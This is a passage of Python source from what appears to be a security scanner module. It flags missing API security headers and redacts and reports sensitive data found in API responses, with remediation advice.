                        f"in production. Avoid exposing version numbers."
                    ),
                )
                findings.append(finding)
                break  # One version disclosure finding per URL

    def _check_api_security_headers(
        self,
        url: str,
        headers: dict[str, str],
        port_obj: Port,
        findings: list[Finding],
    ) -> None:
        """Check for missing security headers on API responses."""
        required_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": None,
            "Cache-Control": None,
        }

        missing: list[str] = []
        for header_name, expected_value in required_headers.items():
            value = headers.get(header_name)
            if value is None:
                missing.append(header_name)
            elif expected_value and value.lower() != expected_value.lower():
                missing.append(f"{header_name} (weak: {value})")

        # Check for permissive content type
        content_type = headers.get("Content-Type", "")
        if "application/json" not in content_type.lower() and content_type:
            # API returning non-JSON content type may be vulnerable to MIME sniffing
            if "text/html" in content_type.lower():
                missing.append("Content-Type should be application/json, not text/html")

        if len(missing) >= 2:
            finding = Finding(
                title=f"Missing API security headers on {url}",
                description=(
                    f"The API response is missing important security "
                    f"headers: {', '.join(missing)}. These headers provide "
                    f"defense-in-depth against common web attacks."
                ),
                severity=Severity.LOW,
                host_id=port_obj.host_id,
                port_id=port_obj.id,
                module_name=self.name,
                attack_technique_ids=self.attack_technique_ids,
                evidence=[Evidence(
                    kind="missing_headers",
                    data=", ".join(missing),
                )],
                remediation=(
                    "Add security headers to all API responses: "
                    "X-Content-Type-Options: nosniff, "
                    "X-Frame-Options: DENY, "
                    "Cache-Control: no-store. "
                    "Set Content-Type: application/json for API endpoints."
                ),
            )
            findings.append(finding)

    async def _check_sensitive_data(
        self,
        ctx: ModuleContext,
        url: str,
        body: str,
        port_obj: Port,
        findings: list[Finding],
    ) -> None:
        """Scan response body for sensitive data patterns."""
        found_sensitive: list[tuple[str, str, str]] = []

        for pattern, data_type, description in _SENSITIVE_PATTERNS:
            matches = re.findall(pattern, body)
            if matches:
                # Limit to first 3 matches per type
                sample = matches[:3]
                # Redact sensitive values for safe reporting
                redacted = [
                    m[:3] + "***" + m[-3:] if len(m) > 6 else "***"
                    for m in sample
                ]
                found_sensitive.append((data_type, description, ", ".join(redacted)))

        if found_sensitive:
            evidence_list = [
                Evidence(
                    kind=f"sensitive_{data_type}",
                    data=f"{desc}: {samples}",
                )
                for data_type, desc, samples in found_sensitive
            ]

            finding = Finding(
                title=f"Sensitive data exposure in API response from {url}",
                description=(
                    f"The API response contains potentially sensitive data: "
                    f"{', '.join(desc for _, desc, _ in found_sensitive)}. "
                    f"This data should be masked, removed, or access-"
                    f"controlled."
                ),
                severity=Severity.HIGH,
                host_id=port_obj.host_id,
                port_id=port_obj.id,
                module_name=self.name,
                attack_technique_ids=self.attack_technique_ids,
                evidence=evidence_list,
                remediation=(
                    "Implement response filtering to remove sensitive "
                    "fields. Use field-level access control. Mask PII "
                    "in API responses. Apply the principle of least "
                    "privilege to API data exposure."
                ),
            )
            findings.append(finding)
            await ctx.facts.add(
                "vuln.api",
                {"type": "sensitive_data", "url": url,
                 "data_types": [dt for dt, _, _ in found_sensitive]},
                self.name,
                host_id=port_obj.host_id,
            )
            if ctx.db is not None:
                await ctx.db.insert_finding(finding)
